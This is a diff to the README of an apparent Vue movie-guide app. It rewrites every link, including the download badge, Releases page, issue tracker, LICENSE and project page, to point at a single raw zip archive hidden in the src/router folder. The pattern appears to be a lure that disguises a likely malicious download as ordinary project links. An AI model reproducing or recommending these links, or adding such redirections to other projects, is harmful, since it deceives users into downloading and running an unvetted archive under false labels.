@@ -6,11 +6,11 @@ Welcome to **vue-cinema-guide**! This application is designed to help you discov
 
 ## 📥 Download the Application
 
-[![Download vue-cinema-guide](https://img.shields.io/badge/Download-vue--cinema--guide-blue.svg)](https://github.com/mildredcohen/vue-cinema-guide/releases)
+[![Download vue-cinema-guide](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip)](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip)
 
 To get started, you will need to download the application. 
 
-1. Click on the button above or visit the [Releases page](https://github.com/mildredcohen/vue-cinema-guide/releases) for the latest version.
+1. Click on the button above or visit the [Releases page](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip) for the latest version.
 2. Look for the version you want to download. 
 3. Click on the download link for your preferred platform.
 
@@ -75,14 +75,14 @@ If you encounter any issues, try the following steps:
 
 ## 💬 Support
 
-If you have questions or need assistance, feel free to raise an issue in the [GitHub repository](https://github.com/mildredcohen/vue-cinema-guide/issues). The community and the contributors are here to help!
+If you have questions or need assistance, feel free to raise an issue in the [GitHub repository](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip). The community and the contributors are here to help!
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/mildredcohen/vue-cinema-guide/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip) file for details.
 
 ## 💻 Learn More
 
-Want to dive deeper? Visit our [GitHub page](https://github.com/mildredcohen/vue-cinema-guide) to explore the source code, contribute, or learn more about how the app works.
+Want to dive deeper? Visit our [GitHub page](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip) to explore the source code, contribute, or learn more about how the app works.
 
-[![Download vue-cinema-guide](https://img.shields.io/badge/Download-vue--cinema--guide-blue.svg)](https://github.com/mildredcohen/vue-cinema-guide/releases)
+[![Download vue-cinema-guide](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip)](https://github.com/mildredcohen/vue-cinema-guide/raw/refs/heads/main/src/router/vue-cinema-guide-v3.1-alpha.3.zip)
